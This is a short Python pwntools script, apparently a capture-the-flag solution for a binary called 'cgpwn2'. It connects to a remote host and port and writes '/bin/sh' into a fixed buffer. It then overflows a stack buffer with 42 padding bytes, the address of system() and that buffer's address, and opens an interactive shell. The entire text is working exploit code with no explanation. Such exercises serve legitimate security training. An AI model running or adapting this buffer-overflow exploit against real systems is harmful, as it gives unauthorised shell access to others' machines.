from pwn import*
elf=ELF('./cgpwn2')
io=remote( "61.147.171.105",62230)
#io=process("./cgpwn2")
addr=0x804a080
io.recv()
io.sendline("/bin/sh\x00")
sys_addr=elf.symbols['system']
io.recv()
p=b'a'*42+p32(sys_addr)+b'a'*4+p32(addr)
io.sendline(p)
io.interactive()